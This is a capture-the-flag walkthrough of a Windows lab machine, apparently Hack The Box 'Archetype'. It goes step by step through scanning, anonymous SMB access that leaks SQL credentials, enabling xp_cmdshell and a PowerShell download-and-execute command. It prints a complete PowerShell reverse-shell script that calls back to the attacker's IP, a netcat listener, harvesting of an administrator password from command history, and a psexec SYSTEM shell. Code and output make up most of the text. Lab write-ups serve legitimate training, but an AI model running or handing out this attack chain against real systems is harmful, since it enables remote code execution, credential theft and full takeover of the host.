### 1. Port scan using nmap

```
$ nmap -A 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 20:23 JST
Nmap scan report for 10.10.10.27
Host is up (0.17s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-21T11:39:50
|_Not valid after:  2051-06-21T11:39:50
|_ssl-date: 2021-06-21T11:47:08+00:00; +23m08s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h47m08s, deviation: 3h07m52s, median: 23m07s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-21T04:46:59-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-21T11:46:56
|_  start_date: N/A
```

### 2. Analyze open port
This server uses SMB (TCP:445) and therefore open 135 and 139(need for SMB).
So, try to connect SMB.
 
```
$ smbclient -L 10.10.10.27
Enter WORKGROUP\tk's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

### 3. Connect to SMB ( Windows share file )
We can connect **backups** without password.

```
$ smbclient //10.10.10.27/backups 
Enter WORKGROUP\tk's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 21:20:57 2020
  ..                                  D        0  Mon Jan 20 21:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 21:23:02 2020
g
		10328063 blocks of size 4096. 8257809 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> exit
```

We can get **prod.dtsConfig** file.
The user name and password for SQL Server are written in this file.

### 4. Try to connect SQL Sever, 1433/TCP
Nomarly we use ```sqlcmd``` command to connect SQL Server, but it seems that its command is ***not*** supported for KALI Linux.

So, we have to use another mssql client tools for Kali.
I searched the words "Kali mssql client github" on Google and found impacket which I wanted.

```
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ cd impacket
$ python3 -m pip install .
```

and try to connect SSIS(SQL Server).

```
$ cd example
# ex) $ python3 mssqlclient.py ID@host -windows-auth
$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```

Check this user's group.
If this user belongs to 'sysadmin', you can use ```xp_cmdshell $comannd_name``` which can execuite commands on SQL.
Japanese specification is [here](https://docs.microsoft.com/ja-jp/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15 "SQL")

```
SQL> IF IS_SRVROLEMEMBER('sysadmin') = 1 print 'sysadmin';
[*] INFO(ARCHETYPE): Line 1: sysadmin
```

Fourtunately, this user belogs to 'sysadmin'.
Show all congiretion of SQL to see 'xp_cmd' command is available.

```
SQL> sp_configure
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   

access check cache quota                        0    2147483647              0             0   

Ad Hoc Distributed Queries                      0             1              0             0   

affinity I/O mask                     -2147483648    2147483647              0             0   

affinity mask                         -2147483648    2147483647              0             0   

affinity64 I/O mask                   -2147483648    2147483647              0             0   

affinity64 mask                       -2147483648    2147483647              0             0   

Agent XPs                                       0             1              0             0   

allow polybase export                           0             1              0             0   

allow updates                                   0             1              0             0   

automatic soft-NUMA disabled                    0             1              0             0   

backup checksum default                         0             1              0             0   

backup compression default                      0             1              0             0   

blocked process threshold (s)                   0         86400              0             0   

c2 audit mode                                   0             1              0             0   

clr enabled                                     0             1              0             0   

clr strict security                             0             1              1             1   

contained database authentication               0             1              0             0   

cost threshold for parallelism                  0         32767              5             5   

cross db ownership chaining                     0             1              0             0   

cursor threshold                               -1    2147483647             -1            -1   

Database Mail XPs                               0             1              0             0   

default full-text language                      0    2147483647           1033          1033   

default language                                0          9999              0             0   

default trace enabled                           0             1              1             1   

disallow results from triggers                  0             1              0             0   

external scripts enabled                        0             1              0             0   

filestream access level                         0             2              0             0   

fill factor (%)                                 0           100              0             0   

ft crawl bandwidth (max)                        0         32767            100           100   

ft crawl bandwidth (min)                        0         32767              0             0   

ft notify bandwidth (max)                       0         32767            100           100   

ft notify bandwidth (min)                       0         32767              0             0   

hadoop connectivity                             0             7              0             0   

index create memory (KB)                      704    2147483647              0             0   

in-doubt xact resolution                        0             2              0             0   

lightweight pooling                             0             1              0             0   

locks                                        5000    2147483647              0             0   

max degree of parallelism                       0         32767              0             0   

max full-text crawl range                       0           256              4             4   

max server memory (MB)                        128    2147483647     2147483647    2147483647   

max text repl size (B)                         -1    2147483647          65536         65536   

max worker threads                            128         65535              0             0   

media retention                                 0           365              0             0   

min memory per query (KB)                     512    2147483647           1024          1024   

min server memory (MB)                          0    2147483647              0            16   

nested triggers                                 0             1              1             1   

network packet size (B)                       512         32767           4096          4096   

Ole Automation Procedures                       0             1              0             0   

open objects                                    0    2147483647              0             0   

optimize for ad hoc workloads                   0             1              0             0   

PH timeout (s)                                  1          3600             60            60   

polybase network encryption                     0             1              1             1   

precompute rank                                 0             1              0             0   

priority boost                                  0             1              0             0   

query governor cost limit                       0    2147483647              0             0   

query wait (s)                                 -1    2147483647             -1            -1   

recovery interval (min)                         0         32767              0             0   

remote access                                   0             1              1             1   

remote admin connections                        0             1              0             0   

remote data archive                             0             1              0             0   

remote login timeout (s)                        0    2147483647             10            10   

remote proc trans                               0             1              0             0   

remote query timeout (s)                        0    2147483647            600           600   

Replication XPs                                 0             1              0             0   

scan for startup procs                          0             1              0             0   

server trigger recursion                        0             1              1             1   

set working set size                            0             1              0             0   

show advanced options                           0             1              1             1   

SMO and DMO XPs                                 0             1              1             1   

transform noise words                           0             1              0             0   

two digit year cutoff                        1753          9999           2049          2049   

user connections                                0         32767              0             0   

user options                                    0         32767              0             0   

xp_cmdshell                                     0             1              1             1   
```

You can see 'xp_cmdshell' is available.
If 'xp_cmdshell' is not available, type these commands below.
[Reference](https://qiita.com/mon_tu/items/ef62d22c09411c0b8e99 "ref")

```
> EXEC sp_configure 'show advanced option', '1'; # change options
> reconfigure                                    # exec
> sp_configure                                   # show all configuration
> EXEC sp_configure 'xp_cmdshell', '1'           # to be available 'xp_cmdshell'
> reconfigure
```

Then you can use 'xp_cmdshell' like below.

```
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL         
```

### 4. Get shell (Nomal user)
Then, try to get shell using the code below the same as [writeup](file:///C:/Users/ttakaki/Downloads/Archetype.pdf "writeup").
Don't forget to rewrite 10.10.14.152 to your ip address.
You can get your ip address to use ```ip a``` or ```host -I``` command.

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.152",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "#";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};$client.Close()
```

The [ref0](https://stackoverflow.com/questions/47193282/what-does-bytebytes-0-655350-mean-in-powershell "ref0"), [ref1](https://qiita.com/LazarusMakoto/items/631af8aba4079f82c7c3 "ref1"), [ref2](https://www.vwnet.jp/Windows/PowerShell/Ope/OpeListg.htm "ref2"), [ref3](https://qiita.com/minr/items/b4f71dad4438707d84d3 "ref3"), [ref4](https://win.just4fun.biz/?PowerShell/%E6%96%87%E5%AD%97%E5%88%97%E3%82%92%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%A8%E3%81%97%E3%81%A6%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%83%BBInvoke-Expression "ref4") may help you to understand what the code means.
To put it simply, this code sends a command, displays the returned string, and accepts the command again.

To built a listening server from the attack target, we have to reconfigure our FW rules.
So, allow port 80, 443 from 10.10.10.27, use the command below at your host's terminal, the same location where we made shell.ps1.
Then built a listening server.

```
$ sudo apt install -y ufw
$ sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443
$ sudo python3 -m http.server 80
$ sudo nc -lvnp 443
```

Issue the command below to execute powershell at SQL server which we made.
Don't forget to rewrite 10.10.14.152 to your ip address.

```
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.152/shell.ps1\");"
```

Then, on nc command screen, we can issue any windwos command so put return to it.
And we can fine ```C:\Users\sql_svc\Desktop\user.txt``` which is includeing flag of user own.

```
listening on [any] 443 ...
connect to [10.10.14.152] from (UNKNOWN) [10.10.10.27] 49673
ls


    Directory: C:\Windows\system32


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/15/2018   2:06 AM                0409                                                                  
d-----        1/19/2020   3:09 PM                1033                                                                  
d-----        9/15/2018  12:12 AM                AdvancedInstallers                                                    

............

-a----        9/15/2018  12:09 AM         478208 wuuhext.dll                                                           
-a----        9/15/2018  12:09 AM         179712 wuuhosdeployment.dll                                                  
-a----        9/15/2018  12:09 AM          47616 xcopy.exe                                                             
-a----        9/15/2018  12:09 AM          68096 xmlfilter.dll                                                         
-a----        9/15/2018  12:09 AM         231368 xmllite.dll                                                           
-a----        9/15/2018  12:09 AM          64000 xolehlp.dll     

#cd C:\Users\sql_svc\Desktop
#cat sql_svc/Desktop/user.txt
3eXXXXXXXXXXXXXXXXXXXXXXXXXX21a3

```

### 5. Elavation of privilege
To serch the file which the user used frequency, we can see the ConsoleHost_history.txt file.
The default location of this file is $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt[1](https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics "1").

```
#type C:\Users\sql_svc\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

We can get administrator's password and try to connect as an administrator using it.

```
python3 psexec.py administrator@10.10.10.27
Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file HOiTlZnU.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service YUQr on 10.10.10.27.....
[*] Starting service YUQr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ls
b"'ls' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Windows\system32

01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
09/15/2018  02:06 AM    <DIR>          0409
01/19/2020  04:09 PM    <DIR>          1033
09/15/2018  12:09 AM             2,151 12520437.cpx
09/15/2018  12:09 AM             2,233 12520850.cpx

.................

C:\Windows\system32>cd C:\Users

C:\Users>cd administrator/Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\Administrator\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  33,833,037,824 bytes free

C:\Users\Administrator\Desktop>cat root.txt
b"'cat' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Users\Administrator\Desktop>type root.txt
b91XXXXXXXXXXXXXXXXXXXXXXXXXXX28


```

Finally, we can get root.txt on its Desktop directory.

written by taka.
Please leave your comments if you have trouble.
